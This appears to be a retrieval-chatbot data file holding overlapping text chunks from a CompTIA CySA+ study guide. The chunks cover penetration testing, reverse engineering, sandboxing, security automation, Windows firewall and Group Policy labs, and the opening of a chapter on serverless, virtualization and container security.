rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	gain initial access to a system. Once they establish a foothold, they then seek to escalate their access until they gain complete administrative control of the system. From there, they can scan for additional systems on the network, install additional penetration testing tools, and begin the cycle anew, seeking to expand their footprint within the targeted organization. They continue this cycle until they exhaust the possibilities or the time allotted for the test expires. If you’re interested in penetration testing, CompTIA offers a companion certification to the CySA+ called PenTest+. The PenTest+ certification dives deeply into penetration testing topics. Communicating Penetration Test Results At the conclusion of the penetration test, the testers prepare a detailed report communicating the access they were able to achieve and the vulnerabilities they exploited to gain this access. The results of penetration tests are valuable security planning tools, because they describe the actual vulnerabilities that an attacker might exploit to gain access to a network. Penetration testing reports typically contain detailed appendixes that include the results of various tests and may be shared with system administrators responsible for remediating issues. Training and Exercises In addition to performing penetration tests, some organizations choose to run wargame exercises that pit teams of security professionals against one another in a cyberdefense scenario. These exercises are typically performed in simulated environments, rather than on production networks, and seek to improve the skills of security professionals on both sides by exposing them to the tools and techniques used by attackers. Three teams are involved in most cybersecurity wargames: ■■ ■■ ■■ The red team plays the role of the attacker and uses reconnaissance and exploitation tools to attempt to gain access to the protected network. The red team’s work is similar to that of the testers during a penetration test. The blue team is responsible for securing the targeted environment and keeping the red team out by building, maintaining, and monitoring a comprehensive set of security controls. The white team coordinates the exercise and serves as referees, arbitrating disputes between the team, maintaining the technical environment, and monitoring the results. Cybersecurity wargames can be an effective way to educate security professionals on modern attack and defense tactics. Reverse Engineering 25 Reverse Engineering In many cases, vendors do not release the details of how hardware and software work. Certainly, the authors of malicious software don’t explain their work to the world. In these situations, security professionals may be in the dark about the security of their environments. Reverse engineering is a technique used to work backward from a finished product to figure out how it works. Security professionals sometimes use reverse engineering to learn the inner workings of suspicious software or inspect the integrity of hardware. Reverse engineering uses a philosophy known as decomposition where reverse engineers start with the finished product and work their way back to its component parts. Isolation and Sandboxing One of the most dangerous threats to the security of modern organizations is customized malware developed by
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	In these situations, security professionals may be in the dark about the security of their environments. Reverse engineering is a technique used to work backward from a finished product to figure out how it works. Security professionals sometimes use reverse engineering to learn the inner workings of suspicious software or inspect the integrity of hardware. Reverse engineering uses a philosophy known as decomposition where reverse engineers start with the finished product and work their way back to its component parts. Isolation and Sandboxing One of the most dangerous threats to the security of modern organizations is customized malware developed by APT actors who create specialized tools designed to penetrate a single target. Since they have never been used before, these tools are not detectable with the signature-­detection technology used by traditional antivirus software. Sandboxing is an approach used to detect malicious software based on its behavior rather than its signatures. Sandboxing systems watch systems and the network for unknown pieces of code and, when they detect an application that has not been seen before, immediately isolate that code in a special environment known as a sandbox where it does not have access to any other systems or applications. The sandboxing solution then executes the code and watches how it behaves, checking to see if it begins scanning the network for other systems, gathering sensitive information, communicating with a command-­and-­control server, or performing any other potentially malicious activity. If the sandboxing solution identifies strange behavior, it blocks the code from entering the organization’s network and flags it for administrator review. This process, also known as code detonation, is an example of an automated reverse engineering technique that takes action based on the observed behavior of software. Reverse Engineering Software In most programming languages, developers write software in a human-­readable language such as C/C++, Java, Ruby, or Python. Depending on the programming language, the computer may process this code in one of two ways. In interpreted languages, such as Ruby and Python, the computer works directly from the source code. Reverse engineers seeking to analyze code written in interpreted languages can simply read through the code and often get a good idea of what the code is attempting to accomplish. In compiled languages, such as Java and C/C++, the developer uses a tool called a compiler to convert the source code into binary code that is readable by the computer. This binary code is what is often distributed to users of the software, and it is very difficult, if not 26 Chapter 1 ■ Today’s Cybersecurity Analyst impossible, to examine binary code and determine what it is doing, making the reverse engineering of compiled languages much more difficult. Technologists seeking to reverse-­engineer compiled code have two options. First, they can attempt to use a specialized program known as a decompiler to convert the binary code back to source code. Unfortunately, however, this process usually does not work very well. Second, they can use a specialized environment and carefully monitor how software responds
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	code is what is often distributed to users of the software, and it is very difficult, if not 26 Chapter 1 ■ Today’s Cybersecurity Analyst impossible, to examine binary code and determine what it is doing, making the reverse engineering of compiled languages much more difficult. Technologists seeking to reverse-­engineer compiled code have two options. First, they can attempt to use a specialized program known as a decompiler to convert the binary code back to source code. Unfortunately, however, this process usually does not work very well. Second, they can use a specialized environment and carefully monitor how software responds to different inputs in an attempt to discover its inner workings. In either case, reverse engineering compiled software is extremely difficult. Fingerprinting Software Although it is difficult to reverse-­engineer compiled code, technologists can easily detect whether two pieces of compiled code are identical or whether one has been modified. Hashing is a mathematical technique that analyzes a file and computes a unique fingerprint, known as a message digest or hash, for that file. Analysts using hash functions, such as the Secure Hash Algorithm (SHA), can compute the hashes of two files and compare the output values. If the hashes are identical, the file contents are identical. If the hashes differ, the two files contain at least one difference. Reverse Engineering Hardware Reverse engineering hardware is even more difficult than reverse engineering software because the authenticity of hardware often rests in the invisible code embedded within integrated circuits and firmware contents. Although organizations may perform a physical inspection of hardware to detect tampering, it is important to verify that hardware has source authenticity, meaning that it comes from a trusted, reliable source, because it is simply too difficult to exhaustively test hardware. The U.S. government recognizes the difficulty of ensuring source authenticity and operates a trusted foundry program for critical defense systems. The U.S. Department of Defense (DoD) and National Security Agency (NSA) certify companies as trusted foundries that are approved to create sensitive integrated circuits for government use. Companies seeking trusted foundry status must show that they completely secure the production process, including design, prototyping, packing, assembly, and other elements of the process. Reverse engineers seeking to determine the function of hardware use some of the same techniques used for compiled software, particularly when it comes to observing behavior. Operating a piece of hardware in a controlled environment and observing how it responds to different inputs provides clues to the functions performed in the hardware. Reverse engineers may also seek to obtain documentation from original equipment manufacturers (OEMs) that provide insight into how components of a piece of hardware function. Efficiency and Process Improvement 27 Compromising Cisco Routers According to NSA documents released by Edward Snowden, the U.S. government has engaged in reverse engineering of hardware designed to circumvent security. Source: Electronic Frontier Foundation / CC BY 3.0 US. In a process shown in this photo, NSA employees intercepted packages containing Cisco routers, switches, and other network gear after it
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	how it responds to different inputs provides clues to the functions performed in the hardware. Reverse engineers may also seek to obtain documentation from original equipment manufacturers (OEMs) that provide insight into how components of a piece of hardware function. Efficiency and Process Improvement 27 Compromising Cisco Routers According to NSA documents released by Edward Snowden, the U.S. government has engaged in reverse engineering of hardware designed to circumvent security. Source: Electronic Frontier Foundation / CC BY 3.0 US. In a process shown in this photo, NSA employees intercepted packages containing Cisco routers, switches, and other network gear after it left the factory and before it reached the customer. They then opened the packages and inserted covert firmware into the devices that facilitated government monitoring. Efficiency and Process Improvement Cybersecurity analysts perform a tremendous amount of routine work. From analyzing logs to assessing vulnerabilities, our work can be sometimes tedious and often error-­prone. Strong cybersecurity teams invest time and money in improving their own processes, using standardization and automation to improve their efficiency, reduce the likelihood of error, and free up the valuable time of analysts for more significant work. 28 Chapter 1 ■ Today’s Cybersecurity Analyst Exam Note As you prepare for the exam, you should be very focused on this content, as it is directly listed in the exam objectives. CompTIA wants cybersecurity analysts to focus on standardizing processes and streamlining operations. A very effective way to achieve this goal is to integrate diverse technologies and tools into a “single pane of glass” monitoring solution. Standardize Processes and Streamline Operations One of the first ways that teams can improve their efficiency is to create standardized processes for recurring activities. When you find yourself facing a task where you’re inventing a solution by the seat of your pants, that’s a good sign that you might benefit from taking the time to create a standardized process for handling similar events in the future. This is especially true for activities you find yourself repeating time and time again. Standardizing processes reduces the amount of effort required to react to a task. You no longer need to figure out what to do the next time this task comes up—­you simply turn to your playbook for that standardized process and carry out the steps that you’ve already thought through. These processes also have the added benefit of ensuring that different members of the team respond consistently in similar situations. Cybersecurity Automation Standardizing tasks also helps you identify opportunities for automation. You may be able to go beyond standardizing the work of team members and automate some responses to take people out of the loop entirely. In the terms used by CompTIA, you’re “minimizing human engagement.” Security orchestration, automation, and response (SOAR) platforms provide many opportunities to automate security tasks that cross between multiple systems. You may wish to coordinate with other members of your team taking an inventory of all the activities performed by the team and identify those that are suitable for
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	team respond consistently in similar situations. Cybersecurity Automation Standardizing tasks also helps you identify opportunities for automation. You may be able to go beyond standardizing the work of team members and automate some responses to take people out of the loop entirely. In the terms used by CompTIA, you’re “minimizing human engagement.” Security orchestration, automation, and response (SOAR) platforms provide many opportunities to automate security tasks that cross between multiple systems. You may wish to coordinate with other members of your team taking an inventory of all the activities performed by the team and identify those that are suitable for automation. The two key characteristics of processes that can be automated are that they are both repeatable and do not require human interaction. Once you have automations in place, you’ll just need to coordinate with your team to manage existing automations and facilitate the adoption of new automations. SOAR platforms also offer opportunities to improve your organization’s use of threat intelligence. By bringing information about emerging threats into your SOAR platform, you can enrich data about ongoing incidents and improve your ability to react to emerging cybersecurity situations. The SOAR platform provides you with the opportunity to combine information received through multiple threat feeds and develop a comprehensive picture of the cybersecurity landscape and your security posture. Efficiency and Process Improvement 29 Technology and Tool Integration Cybersecurity is full of tedious work. From performing vulnerability scans of large networks to conducting file integrity tests, we often need to use very repetitive processes to achieve our objectives. If we tried to get this work done manually, it would be so time-­consuming that we would stop from exhaustion before we ever finished. Workflow orchestration techniques help us automate many of these repetitive tasks. In addition to the SOAR platforms we’ve already discussed, there are two more ways that we can automate our workflows: scripting, which is writing code that automates our work, and integration, which uses vendor-­provided interfaces to tie different products together. Analysts commonly take advantage of application programming interfaces (APIs) as a primary means of integrating diverse security tools. APIs are programmatic interfaces to services that allow you to interact with that service without using web-­based interfaces. You can normally perform the same actions with an API that you could perform at a service’s web-­based interface, but the API allows you to write code to automate those actions. APIs are powerful to cybersecurity analysts because we can use them to reach into a wide variety of systems. Our security tools often offer APIs that we can leverage in our automation work, but so do many other technology services. We can use APIs to automate the provisioning of cloud resources, to retrieve access logs from remote services, and automate many other routine tasks. Webhooks allow us to send a signal from one application to another using a web request. For example, you might want to run a vulnerability scan every time your threat intelligence platform receives a report of a new
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	powerful to cybersecurity analysts because we can use them to reach into a wide variety of systems. Our security tools often offer APIs that we can leverage in our automation work, but so do many other technology services. We can use APIs to automate the provisioning of cloud resources, to retrieve access logs from remote services, and automate many other routine tasks. Webhooks allow us to send a signal from one application to another using a web request. For example, you might want to run a vulnerability scan every time your threat intelligence platform receives a report of a new vulnerability. In that case, you may be able to configure a webhook action in the threat intelligence platform that sends a request to the vulnerability scanner’s API each time a new vulnerability is reported. That request could trigger the desired scan. Plug-­ins also provide an opportunity to increase integrations. These are small programs that run inside of other programs, adding additional functionality. For example, you might use a browser plug-­in to perform data enrichment. That plug-­in might automatically pull up Whois and reputation data each time you hover over an IP address in your browser. The ultimate goal of cybersecurity automation is to achieve a single pane of glass approach to security operations. In this philosophy, cybersecurity analysts integrate all their tools into a single platform, so they can use one consistent interface to perform all of their work. Now, of course, this isn’t really an achievable goal. There’s always going to be “one more system” that prevents you from truly reaching a single pane of glass approach. However, as a design principle, reducing the number of interfaces that cybersecurity analysts must use each day can dramatically increase their efficiency. Bringing Efficiency to Incident Response Incident response is one of the rapidly emerging areas of automation, as security teams seek to bring the power of automation to what is often the most human-­centric task in cybersecurity: investigating anomalous activity. While SOAR automation and other security tools may 30 Chapter 1 ■ Today’s Cybersecurity Analyst trigger an incident investigation, the work of the incident responder from that point forward is often a very manual process that involves the application of tribal knowledge, personal experience, and instinct. Enriching Incident Response Data While incident response will likely always involve a significant component of human intervention, some organizations are experiencing success with automating portions of their incident response programs. One of the best starting points for incident response automation involves providing automated enrichment of incident response data to human analysts, saving them the tedious time of investigating routine details of an incident. For example, when an intrusion detection system identifies a potential attack, a security automation workflow can trigger a series of activities. These might include: ■■ ■■ ■■ Performing reconnaissance on the source address of the attack, including IP address ownership and geolocation information Supplementing the initial report with other log information for the targeted system based upon a security information and event
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	of their incident response programs. One of the best starting points for incident response automation involves providing automated enrichment of incident response data to human analysts, saving them the tedious time of investigating routine details of an incident. For example, when an intrusion detection system identifies a potential attack, a security automation workflow can trigger a series of activities. These might include: ■■ ■■ ■■ Performing reconnaissance on the source address of the attack, including IP address ownership and geolocation information Supplementing the initial report with other log information for the targeted system based upon a security information and event management (SIEM) query. SIEMs are an important security technology that you’ll find covered in Chapter 3, “Malicious Activity.” Triggering a vulnerability scan of the targeted system designed to assist in determining whether the attack has a high likelihood of success All of these actions can take place immediately upon the detection of the incident and appended to the incident report in the tracking system for review by a cybersecurity analyst. Teams seeking to implement incident response data enrichment will benefit from observing the routine activities of first responders and identifying any information gathering requirements that are possible candidates for automation. Automate Portions of Incident Response Playbooks In addition to enriching the data provided to cybersecurity analysts responding to an incident, automation may also play a role in improving the efficiency of response actions. Incident response teams commonly use playbooks that define the sequence of steps they will follow when responding to common incident types. Actions defined in a playbook may include activities designed to contain the incident, eradicate the effects of the incident from the network, and recover normal operations. You’ll find more coverage of playbooks in Chapter 9, “Building an Incident Response Program.” In some cases, it is reasonable to believe that the response to a security incident may be fully automated. For example, if a system on the local network begins emitting high volumes of traffic targeted at remote web servers, a reasonable analyst might conclude that the system is compromised and participating in a botnet-­driven denial-­of-­service attack. The natural reaction of that analyst might then be to immediately quarantine the system to contain the damage and then send a case to the appropriate IT support technician to investigate and resolve the issue. That straightforward response is a prime candidate for automation. Summary 31 Integrations between the security automation platform, networking devices, and the ticketing systems can perform all these activities without any human intervention. While the response to some simple incidents may be fully automated, many incidents have unique characteristics that require some degree of human intervention. Even in those cases, portions of the incident response playbook may still be automated beyond the data enrichment stage. For example, a cybersecurity analyst may have a dashboard that allows them to trigger a sequence of activities that blocks access to all resources for an individual user, quarantines suspect systems, or activates an incident escalation process. The Future of Cybersecurity
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	automation platform, networking devices, and the ticketing systems can perform all these activities without any human intervention. While the response to some simple incidents may be fully automated, many incidents have unique characteristics that require some degree of human intervention. Even in those cases, portions of the incident response playbook may still be automated beyond the data enrichment stage. For example, a cybersecurity analyst may have a dashboard that allows them to trigger a sequence of activities that blocks access to all resources for an individual user, quarantines suspect systems, or activates an incident escalation process. The Future of Cybersecurity Analytics As we continue to develop our cybersecurity analytics capabilities, the tools and techniques available to us advance in sophistication. The area of greatest promise for future cybersecurity analytics tools is the continued adoption of machine learning techniques designed to automatically extract knowledge from the voluminous quantity of information generated by security systems. Machine learning techniques are already incorporated into many security analytics tools, providing automated analysis of data based on the experiences of other users of the tool. Expect to see these capabilities continue to develop as organizations harvest the power of machine learning to reduce the requirements for human analysts to perform burdensome sifting of data and allow them to focus on the output of machine learning algorithms that guide them toward more productive work. Summary Cybersecurity professionals are responsible for ensuring the confidentiality, integrity, and availability of information and systems maintained by their organizations. Confidentiality ensures that unauthorized individuals are not able to gain access to sensitive information. Integrity ensures that there are no unauthorized modifications to information or systems, either intentionally or unintentionally. Availability ensures that information and systems are ready to meet the needs of legitimate users at the time those users request them. Together, these three goals are known as the CIA Triad. As cybersecurity analysts seek to protect their organizations, they must evaluate risks to the CIA Triad. This includes identifying vulnerabilities, recognizing corresponding threats, and determining the level of risk that results from vulnerability and threat combinations. Analysts must then evaluate each risk and identify appropriate risk management strategies to mitigate or otherwise address the risk. They may use machine learning techniques to assist with this work. 32 Chapter 1 ■ Today’s Cybersecurity Analyst Cybersecurity analysts mitigate risks using security controls designed to reduce the likelihood or impact of a risk. Network security controls include network access control (NAC) systems, firewalls, and network segmentation. Secure endpoint controls include hardened system configurations, patch management, Group Policies, and endpoint security software. Penetration tests and reverse engineering provide analysts with the reassurance that the controls they’ve implemented to mitigate risks are functioning properly. By following a careful risk analysis and control process, analysts significantly enhance the confidentiality, integrity, and availability of information and systems under their control. Finally, cybersecurity analysts should take the time to invest in their own operations practices through efficiency and process improvement initiatives. Projects that standardize processes, streamline operations, and integrate
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	security controls include network access control (NAC) systems, firewalls, and network segmentation. Secure endpoint controls include hardened system configurations, patch management, Group Policies, and endpoint security software. Penetration tests and reverse engineering provide analysts with the reassurance that the controls they’ve implemented to mitigate risks are functioning properly. By following a careful risk analysis and control process, analysts significantly enhance the confidentiality, integrity, and availability of information and systems under their control. Finally, cybersecurity analysts should take the time to invest in their own operations practices through efficiency and process improvement initiatives. Projects that standardize processes, streamline operations, and integrate technologies and tools make the work of cybersecurity analysts easier, increasing productivity and reducing the likelihood of error. Exam Essentials Know the three objectives of cybersecurity. Confidentiality ensures that unauthorized individuals are not able to gain access to sensitive information. Integrity ensures that there are no unauthorized modifications to information or systems, either intentionally or unintentionally. Availability ensures that information and systems are ready to meet the needs of legitimate users at the time those users request them. Know how cybersecurity risks result from the combination of a threat and a vulnerability. A vulnerability is a weakness in a device, system, application, or process that might allow an attack to take place. A threat in the world of cybersecurity is an outside force that may exploit a vulnerability. Be able to categorize cybersecurity threats as adversarial, accidental, structural, or environmental. Adversarial threats are individuals, groups, and organizations that are attempting to deliberately undermine the security of an organization. Accidental threats occur when individuals doing their routine work mistakenly perform an action that undermines security. Structural threats occur when equipment, software, or environmental controls fail due to the exhaustion of resources, exceeding their operational capability or simply failing due to age. Environmental threats occur when natural or human-­made disasters occur that are outside the control of the organization. Understand how networks are made more secure through the use of network access control, firewalls, and segmentation. Network access control (NAC) solutions help security professionals achieve two cybersecurity objectives: limiting network access to authorized individuals and ensuring that systems accessing the organization’s network meet basic security requirements. Network firewalls sit at the boundaries between networks and provide perimeter security. Network segmentation uses isolation to separate networks of differing security levels from each other. Lab Exercises 33 Understand how endpoints are made more secure through the use of hardened configurations, patch management, Group Policy, and endpoint security software. Hardening configurations includes disabling any unnecessary services on the endpoints to reduce their susceptibility to attack, ensuring that secure configuration settings exist on devices, and centrally controlling device security settings. Patch management ensures that operating systems and applications are not susceptible to known vulnerabilities. Group Policy allows the application of security settings to many devices simultaneously, and endpoint security software protects against malicious software and other threats. Know that penetration tests provide organizations with an attacker’s perspective on their security. The NIST process for penetration testing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	through the use of hardened configurations, patch management, Group Policy, and endpoint security software. Hardening configurations includes disabling any unnecessary services on the endpoints to reduce their susceptibility to attack, ensuring that secure configuration settings exist on devices, and centrally controlling device security settings. Patch management ensures that operating systems and applications are not susceptible to known vulnerabilities. Group Policy allows the application of security settings to many devices simultaneously, and endpoint security software protects against malicious software and other threats. Know that penetration tests provide organizations with an attacker’s perspective on their security. The NIST process for penetration testing divides tests into four phases: planning, discovery, attack, and reporting. The results of penetration tests are valuable security planning tools, since they describe the actual vulnerabilities that an attacker might exploit to gain access to a network. Understand how reverse engineering techniques attempt to determine how hardware and software function internally. Sandboxing is an approach used to detect malicious software based on its behavior rather than its signatures. Other reverse engineering techniques are difficult to perform, are often unsuccessful, and are quite time-­consuming. Know how machine learning technology facilitates cybersecurity analysis. The area of greatest promise for future cybersecurity analytics tools is the continued adoption of machine learning techniques designed to automatically extract knowledge from the voluminous quantity of information generated by security systems. Machine learning techniques are already incorporated into many security analytics tools, providing automated analysis of data based on the experiences of other users of the tool. Understand the importance of efficiency and process improvements to security operations. Cybersecurity analysis is difficult, and sometimes tedious, work. Projects that work to streamline operations, standardize processes, and increase integrations of tools and technologies allow work to flow more smoothly. This not only boosts the efficiency and effectiveness of cybersecurity analysts but also reduces the likelihood of error. Lab Exercises Activity 1.1: Create an Inbound Firewall Rule In this lab, you will verify that the Windows Defender Firewall is enabled on a server and then create an inbound firewall rule that blocks file and printer sharing. These lab instructions were written to run on a system running Windows Server 2022. The process for working on other versions of Windows Server is quite similar, although the exact names of services, options, and icons may differ slightly. 34 Chapter 1 ■ Today’s Cybersecurity Analyst You should perform this lab on a test system. Enabling file and printer sharing on a production system may have undesired consequences. The easiest way to get access to a Windows Server 2022 system is to create an inexpensive cloud instance through Amazon Web Services (AWS) or Microsoft Azure. Part 1: Verify that Windows Defender Firewall is enabled 1. Open Control Panel for your Windows Server. 2. Choose System and Security. 3. Under Windows Defender Firewall, click Check Firewall Status. 4. Verify that the Windows Defender Firewall state is set to On for Private networks. If it is not on, enable the firewall by using the “Turn Windows
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	system. Enabling file and printer sharing on a production system may have undesired consequences. The easiest way to get access to a Windows Server 2022 system is to create an inexpensive cloud instance through Amazon Web Services (AWS) or Microsoft Azure. Part 1: Verify that Windows Defender Firewall is enabled 1. Open Control Panel for your Windows Server. 2. Choose System and Security. 3. Under Windows Defender Firewall, click Check Firewall Status. 4. Verify that the Windows Defender Firewall state is set to On for Private networks. If it is not on, enable the firewall by using the “Turn Windows Defender Firewall on or off” link on the left side of the window. Part 2: Create an inbound firewall rule that allows file and printer sharing 1. On the left side of the Windows Defender Firewall Control Panel, click “Allow an app or feature through Windows Defender Firewall.” 2. Scroll down the list of applications and find File and Printer Sharing. 3. Check the box to the left of that entry to block connections related to File and Printer Sharing. 4. Confirm that the Private box to the right of that option was automatically selected. This allows File and Printer Sharing only for other systems on the same local network. The box for public access should be unchecked, specifying that remote systems are not able to access this feature. 5. Click OK to apply the setting. Activity 1.2: Create a Group Policy Object In this lab, you will create a Group Policy Object and edit its contents to enforce an organization’s password policy. These lab instructions were written to run on a system running Windows Server 2022. The process for working on other versions of Windows Server is quite similar, although the exact names of services, options, and icons may differ slightly. To complete this lab, your Windows Server must be configured as a domain controller. 1. Open the Group Policy Management application. (If you do not find this application on your Windows Server, it is likely that it is not configured as a domain controller.) 2. Expand the folder corresponding to your Active Directory forest. 3. Expand the Domains folder. 4. Expand the folder corresponding to your domain. 5. Right-­click the Group Policy Objects folder and select New from the pop-­up menu. Lab Exercises 35 6. Name your new GPO Password Policy and click OK. 7. Click the Group Policy Objects folder. 8. Right-­click the new Password Policy GPO and select Edit from the pop-­up menu. 9. When Group Policy Management Editor opens, expand the Policies folder under the Computer Configuration section. 10. Expand the Windows Settings folder. 11. Expand the Security Settings folder. 12. Expand the Account Policies folder. 13. Click Password Policy. 14. Double-­click Maximum Password Age. 15. In the pop-­up window, select the Define This Policy Setting check box and set the expi- ration value to 90 days. 16. Click OK to close the window. 17. Click OK to accept the suggested change to the minimum
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Policy Objects folder. 8. Right-­click the new Password Policy GPO and select Edit from the pop-­up menu. 9. When Group Policy Management Editor opens, expand the Policies folder under the Computer Configuration section. 10. Expand the Windows Settings folder. 11. Expand the Security Settings folder. 12. Expand the Account Policies folder. 13. Click Password Policy. 14. Double-­click Maximum Password Age. 15. In the pop-­up window, select the Define This Policy Setting check box and set the expi- ration value to 90 days. 16. Click OK to close the window. 17. Click OK to accept the suggested change to the minimum password age. 18. Double-­click the Minimum Password Length option. 19. As in the prior step, click the box to define the policy setting and set the minimum pass- word length to 12 characters. 20. Click OK to close the window. 21. Double-­click the Password Must Meet Complexity Requirements option. 22. Click the box to define the policy setting and change the value to Enabled. 23. Click OK to close the window. 24. Click the X to exit Group Policy Management Editor. You have now successfully created a Group Policy Object that enforces the organization’s password policy. You can apply this GPO to users and/or groups as needed. Activity 1.3: Write a Penetration Testing Plan For this activity, you will design a penetration testing plan for a test against an organization of your choosing. If you are employed, you may choose to use your employer’s network. If you are a student, you may choose to create a plan for a penetration test of your school. Otherwise, you may choose any organization, real or fictitious, of your choice. Your penetration testing plan should cover the three main criteria required before initiating any penetration test: ■■ Timing ■■ Scope ■■ Authorization 36 Chapter 1 ■ Today’s Cybersecurity Analyst One word of warning: You should not conduct a penetration test without permission of the network owner. This assignment only asks you to design the test on paper. Activity 1.4: Recognize Security Tools Match each of the security tools listed in this table with the correct description. Firewall Determines which clients may access a wired or wireless network Decompiler Creates a unique fingerprint of a file Antivirus Filters network connections based on source, destination, and port NAC System intentionally created to appear vulnerable GPO Attempts to recover source code from binary code Hash Scans a system for malicious software Honeypot Protects against SQL injection attacks WAF Deploys configuration settings to multiple Windows systems Chapter 2 System and Network Architecture THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 1.0: Security Operations ■■ 1.1 Explain the importance of system and network architecture concepts in security operations ■■ Log ingestion ■■ Operating system (OS) concepts ■■ Infrastructure concepts ■■ Network architecture ■■ Identity and access management ■■ Encryption ■■ Sensitive data protection Security operations require an understanding of fundamental concepts of infrastructure, networking architecture, and identity and access management. Modern infrastructure often
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	system for malicious software Honeypot Protects against SQL injection attacks WAF Deploys configuration settings to multiple Windows systems Chapter 2 System and Network Architecture THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 1.0: Security Operations ■■ 1.1 Explain the importance of system and network architecture concepts in security operations ■■ Log ingestion ■■ Operating system (OS) concepts ■■ Infrastructure concepts ■■ Network architecture ■■ Identity and access management ■■ Encryption ■■ Sensitive data protection Security operations require an understanding of fundamental concepts of infrastructure, networking architecture, and identity and access management. Modern infrastructure often includes virtualization, serverless, and containerization, all while running both on-­premises and in the cloud. This can create complex security environments that need to be understood to be properly protected. At the same time, security professionals need to understand the underlying operating systems that computers and systems rely on. Hardening systems, understanding filesystems, being aware of system processes, and even familiarity with the hardware architecture that underlies the systems they are protecting are all skills security practitioners must have. In addition to those core infrastructure and systems concepts, additional technical capabilities like the use of encryption, sensitive data protection, and creating, analyzing, and reviewing logs are all important for security operations. In this chapter, you will learn about current infrastructure design concepts and technologies. You will then explore basic operating system concepts and security practices. Next, you will review the major elements of modern network architecture and security design. Finally, you will dive into identity and access management, encryption, sensitive data protection, and how logs can be used throughout each of these areas to help with security operations. Infrastructure Concepts and Design The CySA+ exam objectives focus on three key concepts related to security operations and infrastructure: serverless computing, virtualization, and containerization. These three models are commonly used throughout modern systems and services, and you can expect to encounter them frequently as a security professional. As you review each of them, consider how they impact security operations, including their similarities and differences in day-­to-­ day security activities and requirements. Serverless Serverless computing in a broad sense describes cloud computing, but much of the time when it is used currently it describes technology sometimes called function as a service (FaaS). In essence, serverless computing relies on a system that executes functions as they are called. That means that when an action needs to be performed, the function is run—­thus Infrastructure Concepts and Design 39 “a function call.” Amazon’s AWS Lambda, Google’s App Engine, and Azure Functions are all examples of serverless computing FaaS implementations. In these cases, security models typically address the functions like other code, meaning that the same types of controls used for software development need to be applied to the function-­as-­a-­service environment. In addition, controls appropriate to cloud computing environments such as access controls and rights, as well as monitoring and resource management capabilities, are necessary to ensure a secure deployment. Serverless brings a number of advantages, including reduced
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	to be performed, the function is run—­thus Infrastructure Concepts and Design 39 “a function call.” Amazon’s AWS Lambda, Google’s App Engine, and Azure Functions are all examples of serverless computing FaaS implementations. In these cases, security models typically address the functions like other code, meaning that the same types of controls used for software development need to be applied to the function-­as-­a-­service environment. In addition, controls appropriate to cloud computing environments such as access controls and rights, as well as monitoring and resource management capabilities, are necessary to ensure a secure deployment. Serverless brings a number of advantages, including reduced costs in some cases because it is billed as it is used rather than constantly running. In addition, overhead costs like server maintenance and management are no longer a consideration as the service is simply used on an as-­needed basis at the scale and frequency required by the application or service. Virtualization Virtualization uses software to run virtual computers on underlying real hardware. This means that you can run multiple systems, running multiple operating systems, all of which act as if they are on their own hardware. This approach provides additional control of factors like resource usage and what hardware is presented to the guest operating systems, and it allows efficient use of the underlying hardware because you can leverage shared resources. Virtualization is used in many ways. It is used to implement virtual desktop infrastructure (VDI), which runs desktop operating systems like Windows on central hardware and streams the desktops across the network to systems. Many organizations virtualize almost all their servers, running clusters of virtualization hosts that host all their infrastructure. Virtual security appliances and other vendor-­provided virtual solutions are also part of the virtualization ecosystem. The advantages of virtualization also come with some challenges for security professionals who must now determine how to monitor, secure, and respond to issues in a virtual environment. Much like the other elements of a security design that we have discussed, preplanning and effort is required to understand the architecture and implementation that your organization will use. Containerization Containerization provides an alternative to virtualizing an entire system and instead permits applications to be run in their own environment with their own required components, such as libraries, configuration files, and other dependencies, in a dedicated container. Kubernetes and Docker are examples of containerization technologies. Containers provide application-­level virtualization. Instead of creating complex virtual machines that require their own operating systems, containers package applications and allow them to be treated as units of virtualization that become portable across operating systems and hardware platforms. 40 Chapter 2 ■ System and Network Architecture Containerization is the process of packaging software with libraries and other dependencies that they need. This creates lightweight, portable containers that can be easily moved between environments while remaining less resource-­hungry than a virtual machine since they use their host system. Organizations implementing containerization run containerization platforms, such as Docker, that provide standardized interfaces to operating system resources. This interface remains consistent, regardless
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	machines that require their own operating systems, containers package applications and allow them to be treated as units of virtualization that become portable across operating systems and hardware platforms. 40 Chapter 2 ■ System and Network Architecture Containerization is the process of packaging software with libraries and other dependencies that they need. This creates lightweight, portable containers that can be easily moved between environments while remaining less resource-­hungry than a virtual machine since they use their host system. Organizations implementing containerization run containerization platforms, such as Docker, that provide standardized interfaces to operating system resources. This interface remains consistent, regardless of the underlying operating system or hardware, and the consistency of the interface allows containers to shift between systems as needed. Containerization platforms share many of the same security considerations as virtualization platforms. They must enforce isolation between containers to prevent operational and security issues that might occur if an application running in one container is able to accidentally or intentionally interact with resources assigned to another container. Containerization allows for a high level of portability, but it also creates new security challenges. Traditional host-­based security may work for the underlying containerization server, but the containers themselves need to be addressed differently. At the same time, since many containers run on the same server, threats to the host OS can impact many containerized services. Fortunately, tools exist to sign container images and to monitor and patch containers. Beyond these tools, traditional hardening, application and service monitoring, and auditing tools can be useful. When addressing containerized systems, bear in mind the shared underlying host as well as the rapid deployment models typically used with containers. Security must be 